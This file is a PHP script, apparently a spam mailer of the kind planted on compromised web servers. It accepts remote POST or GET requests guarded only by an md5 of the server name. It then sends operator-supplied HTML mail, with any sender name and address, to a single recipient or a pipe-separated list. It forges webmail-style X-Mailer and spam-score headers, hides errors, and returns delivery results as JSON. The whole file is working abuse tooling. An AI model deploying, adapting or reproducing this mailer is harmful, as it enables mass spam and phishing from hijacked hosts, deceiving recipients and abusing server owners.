<?php
@set_time_limit(false);
@ini_set("display_errors", false);
$server = $_SERVER["SERVER_NAME"];
if (@isset($_POST["hash"])) {
    if (md5($server) != $_POST["hash"]) {
        header('Content-type: application/json');
        $data = ['enviado' => 'false', 'Error' => 'Hash Inválido'];
        echo json_encode($data);
    } else if (@isset($_POST["to"])) {
        header('Content-type: application/json');
        $to = $_POST["to"];
        $from = $_POST["from"];
        $fromnome = $_POST["name"];
        $subject = $_POST["subject"];
        $html = $_POST["sourcehtml"];
        $headers = "From: " . $fromnome . " <" . $from . ">" . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "X-Mailer: iGMail [www.ig.com.br]\r\n";
        $headers .= "X-Originating-Email: $from\r\n";
        $headers .= "X-Sender:  $from\r\n";
        $headers .= "X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081\r\n";
        $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n\r\n";
        // Plain text version of message
        $body = "--$boundary\r\n" .
            "Content-Type: text/plain; charset=UTF-8\r\n" .
            "Content-Transfer-Encoding: base64\r\n\r\n";
        $body .= chunk_split(base64_encode(strip_tags($html)));

        // HTML version of message
        $body .= "--$boundary\r\n" .
            "Content-Type: text/html; charset=UTF-8\r\n" .
            "Content-Transfer-Encoding: base64\r\n\r\n";
        $body .= chunk_split(base64_encode($html));

        $body .= "--$boundary--";
        if (mail($to, $subject, $body, $headers)) {
            $data = ['enviado' => 'true', 'url' => $server];
            echo json_encode($data);
        } else {
            $data = ['enviado' => 'false', 'url' => $server];
            echo json_encode($data);
        }
    } else if (@isset($_POST["listmail"])) {
        $listmail = $_POST["listmail"];
        $mail = explode("|", $listmail);
        $i = 0;
        $notsend = 0;
        $from = $_POST["from"];
        $fromnome = $_POST["name"];
        $subject = $_POST["subject"];
        $html = $_POST["sourcehtml"];
        $headers = "From: " . $fromnome . " <" . $from . ">" . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "X-Mailer: iGMail [www.ig.com.br]\r\n";
        $headers .= "X-Originating-Email: $from\r\n";
        $headers .= "X-Sender:  $from\r\n";
        $headers .= "X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081\r\n";
        $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n\r\n";
        // Plain text version of message
        $body = "--$boundary\r\n" .
            "Content-Type: text/plain; charset=UTF-8\r\n" .
            "Content-Transfer-Encoding: base64\r\n\r\n";
        $body .= chunk_split(base64_encode(strip_tags($html)));

        // HTML version of message
        $body .= "--$boundary\r\n" .
            "Content-Type: text/html; charset=UTF-8\r\n" .
            "Content-Transfer-Encoding: base64\r\n\r\n";
        $body .= chunk_split(base64_encode($html));

        $body .= "--$boundary--";
        $log = array();
        while ($mail[$i]) {
            if ($notsend < 5) {
                if (mail($mail[$i], $subject, $body, $headers)) {
                    $log += [$mail[$i] => true];
                    $notsend = 0;
                } else {
                    $log += [$mail[$i] => false];
                    $notsend++;
                }
                $i++;
                $count++;
            } else {
                $log += ['Error' => "SENDMAIL OFFLINE"];
                break;
            }
        }
        header('Content-type: application/json');
        echo json_encode($log);
    } else {
        header('Content-type: application/json');
        $data = ['enviado' => 'false', 'Error' => 'Sem parametro [to] ou [Listmail]'];
        echo json_encode($data);
    }
} else if (@isset($_GET["to"])) {
    header('Content-type: application/json');
    $boundary = md5(uniqid() . microtime());
    $to = $_GET["to"];
    $from = 'contato@dinheirode.casa';
    $fromnome = 'Contato';
    $subject = 'Teste de envio de e-mail from ' . $server;
    $html = '<html><body><h1>Olá, ' . $to . '</h1></br>Teste de envio de e-mail com sucesso!</br></body></html>';
    $headers = "From: " . $fromnome . " <" . $from . ">" . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "X-Mailer: iGMail [www.ig.com.br]\r\n";
    $headers .= "X-Originating-Email: $from\r\n";
    $headers .= "X-Sender:  $from\r\n";
    $headers .= "X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081\r\n";
    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n\r\n";
    // Plain text version of message
    $body = "--$boundary\r\n" .
        "Content-Type: text/plain; charset=UTF-8\r\n" .
        "Content-Transfer-Encoding: base64\r\n\r\n";
    $body .= chunk_split(base64_encode(strip_tags($html)));

    // HTML version of message
    $body .= "--$boundary\r\n" .
        "Content-Type: text/html; charset=UTF-8\r\n" .
        "Content-Transfer-Encoding: base64\r\n\r\n";
    $body .= chunk_split(base64_encode($html));

    $body .= "--$boundary--";
    if (mail($to, $subject, $body, $headers)) {
        $data = ['enviado' => 'true', 'url' => $server];
        echo json_encode($data);
    } else {
        $data = ['Error' => "SENDMAIL OFFLINE", 'url' => $server, 'teste' => $boundary];
        echo json_encode($data);
    }
} else {
    header('Content-type: application/json');
    $data = ['enviado' => 'false', 'Error' => 'Erro hash autenticator'];
    echo json_encode($data);
}
